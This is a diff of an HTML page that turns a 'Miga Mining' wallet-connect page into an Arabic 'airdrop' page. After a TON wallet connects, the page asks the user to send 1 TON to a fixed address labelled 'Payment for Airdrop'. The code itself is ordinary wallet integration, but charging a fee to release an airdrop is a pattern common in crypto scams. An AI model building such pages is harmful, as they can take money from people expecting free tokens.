@@ -1,43 +1,97 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Miga Mining - Payment</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تطبيق أيردروب - ربط المحفظة والدفع</title>
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <style>
     body {
-      background-color: #002740;
-      color: white;
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
       text-align: center;
-      padding: 2rem;
+      padding: 20px;
+      background-color: #f0f0f0;
+      direction: rtl;
     }
-    #status {
+    h1 {
+      font-size: 24px;
+      color: #333;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 10px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    #wallet-status {
       margin-top: 20px;
-      font-size: 1.1rem;
+      font-size: 18px;
+      color: #333;
     }
   </style>
-  <script type="module">
-    import { TonConnectUI } from "https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js";
-
-    const tonConnectUI = new TonConnectUI({
-      manifestUrl: "https://raw.githubusercontent.com/ibrahimbosra/Pay/main/tonconnect-manifest.json",
-      buttonRootId: "ton-connect-button"
-    });
-
-    tonConnectUI.onStatusChange(wallet => {
-      const status = document.getElementById('status');
-      if (wallet?.account?.address) {
-        status.innerHTML = `🔗 Connected:<br>${wallet.account.address}`;
-      } else {
-        status.innerText = "Not connected";
-      }
-    });
-  </script>
 </head>
 <body>
-  <h1>Miga Mining - Payment</h1>
-  <div id="ton-connect-button"></div>
-  <div id="status">Not connected</div>
+  <h1>ربط المحفظة وإتمام الدفع</h1>
+  <div id="connect-wallet"></div>
+  <div id="wallet-status">غير متصل</div>
+
+  <script>
+    // تهيئة TonConnect UI
+    const tonConnectUI = new tonconnectui.TonConnectUI({
+      manifestUrl: 'https://your-app.com/tonconnect-manifest.json', // استبدل برابط ملف الـ manifest
+      buttonRootId: 'connect-wallet'
+    });
+
+    // تحديث حالة المحفظة
+    tonConnectUI.onStatusChange(wallet => {
+      const statusDiv = document.getElementById('wallet-status');
+      if (wallet) {
+        statusDiv.textContent = `متصل: ${wallet.account.address.slice(0, 6)}...`;
+        showPaymentButton();
+      } else {
+        statusDiv.textContent = 'غير متصل';
+      }
+    });
+
+    // دالة لإظهار زر الدفع بعد ربط المحفظة
+    function showPaymentButton() {
+      const existingButton = document.getElementById('payment-button');
+      if (!existingButton) {
+        const paymentButton = document.createElement('button');
+        paymentButton.id = 'payment-button';
+        paymentButton.textContent = 'إتمام الدفع (1 TON)';
+        paymentButton.onclick = initiatePayment;
+        document.body.appendChild(paymentButton);
+      }
+    }
+
+    // دالة لإتمام الدفع
+    async function initiatePayment() {
+      try {
+        const transaction = {
+          validUntil: Math.floor(Date.now() / 1000) + 60, // صالحة لمدة 60 ثانية
+          messages: [
+            {
+              address: 'UQADR_wO9cnAQYUGErMlhP57EFWK78aubu20uxUw-n63Tuo4', // عنوان المحفظة الخاص بك
+              amount: '1000000000', // 1 TON (بالـ nanoTON)
+              payload: 'Payment for Airdrop' // تعليق اختياري
+            }
+          ]
+        };
+        const result = await tonConnectUI.sendTransaction(transaction);
+        alert('تم إرسال المعاملة بنجاح!');
+      } catch (error) {
+        console.error('فشل الدفع:', error);
+        alert('فشل إتمام الدفع. تأكد من ربط المحفظة وحاول مرة أخرى.');
+      }
+    }
+  </script>
 </body>
 </html>
